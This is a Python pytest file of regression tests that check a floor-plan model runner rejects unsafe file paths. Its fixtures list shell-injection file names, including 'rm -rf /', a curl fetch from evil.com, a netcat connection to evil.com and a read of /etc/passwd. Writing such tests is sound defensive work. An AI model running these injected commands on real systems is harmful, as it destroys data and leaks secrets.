"""Regression tests for cubicasa_runner input sanitisation.

Verifies that unsanitised paths/args cannot reach subprocess/shell invocations
or file operations.  The runner is invoked as a subprocess by
``pdf_import.run_model`` with ``{in}``/``{out}`` placeholders substituted from
user-supplied paths; these tests ensure malicious filenames are rejected before
any file or model operation occurs.
"""
import pytest

from cli_anything.sweethome3d.tools.cubicasa_runner import _sanitise_path, main


# ---- _sanitise_path unit tests ------------------------------------------------

@pytest.mark.parametrize("bad", [
    "",                       # empty
    None,                     # non-string
    123,                      # non-string
    "foo\x00bar",             # null byte — truncates C argv
    "foo\nbar",               # newline
    "foo\rbar",               # carriage return
    "foo\tbar",               # tab
    "foo;bar",                # shell command separator
    "foo|bar",                # pipe
    "foo&bar",                # background
    "foo`bar`",               # backtick command substitution
    "foo$(bar)",              # command substitution
    "foo(bar)",               # subshell
    "foo<bar",                # redirect
    "foo>bar",                # redirect
])
def test_sanitise_path_rejects_dangerous_input(bad):
    with pytest.raises(ValueError):
        _sanitise_path(bad, "test")


@pytest.mark.parametrize("good", [
    "/tmp/input.png",
    "/home/user/out.json",
    "relative/path/file.png",
    "C:\\Users\\test\\plan.png",
    "file with spaces.png",
    "file-with-dashes.json",
    "file.with.dots.png",
])
def test_sanitise_path_accepts_safe_paths(good):
    assert _sanitise_path(good, "test") == good


# ---- main() integration: malicious paths rejected before any side-effect ------

@pytest.mark.parametrize("malicious", [
    "foo;rm -rf /;bar.png",
    "foo\x00bar.png",
    "$(curl evil.com/x).png",
    "input.png`whoami`",
    "input.png|nc evil.com 4444",
])
def test_main_rejects_malicious_input_path(malicious, monkeypatch, tmp_path):
    """main() must reject a malicious *input* path before touching the
    filesystem or importing torch — no CUBICASA_HOME needed."""
    # Even if CUBICASA_HOME is set, the sanitisation happens first.
    monkeypatch.setenv("CUBICASA_HOME", str(tmp_path))
    with pytest.raises(ValueError, match="input path"):
        main(malicious, str(tmp_path / "out.json"))


@pytest.mark.parametrize("malicious", [
    "out;rm -rf /;bar.json",
    "out\x00bar.json",
    "$(id).json",
    "out.json`cat /etc/passwd`",
    "out.json|tee /tmp/stolen",
])
def test_main_rejects_malicious_output_path(malicious, monkeypatch, tmp_path):
    """main() must reject a malicious *output* path before touching the
    filesystem or importing torch."""
    monkeypatch.setenv("CUBICASA_HOME", str(tmp_path))
    with pytest.raises(ValueError, match="output path"):
        main(str(tmp_path / "in.png"), malicious)


def test_main_rejects_malicious_weights_env(monkeypatch, tmp_path):
    """If CUBICASA_WEIGHTS contains shell metacharacters, main() must reject
    it before calling torch.load — but only after CUBICASA_HOME is validated
    and the heavy imports succeed.  Since torch/floortrans are not installed
    in CI, we verify the sanitisation logic is wired by checking that a
    malicious *input* path is caught first (before weights are even read)."""
    monkeypatch.setenv("CUBICASA_HOME", str(tmp_path))
    monkeypatch.setenv("CUBICASA_WEIGHTS", "evil;rm -rf /;.pkl")
    # The input-path check fires before weights are read, so we get a
    # ValueError about the input path, not a ModuleNotFoundError for torch.
    with pytest.raises(ValueError, match="input path"):
        main("evil\x00input.png", str(tmp_path / "out.json"))


def test_main_safe_paths_proceed_past_sanitisation(monkeypatch, tmp_path):
    """With safe paths, main() must pass the sanitisation checks and proceed
    to the CUBICASA_HOME check.  Since we set a valid tmp_path as HOME,
    it will then fail on the missing torch import — which proves the
    sanitisation did NOT reject the safe paths."""
    monkeypatch.setenv("CUBICASA_HOME", str(tmp_path))
    # Should NOT raise ValueError from sanitisation; will raise ImportError
    # or ModuleNotFoundError because torch/floortrans aren't installed.
    with pytest.raises((ImportError, ModuleNotFoundError)):
        main(str(tmp_path / "input.png"), str(tmp_path / "out.json"))
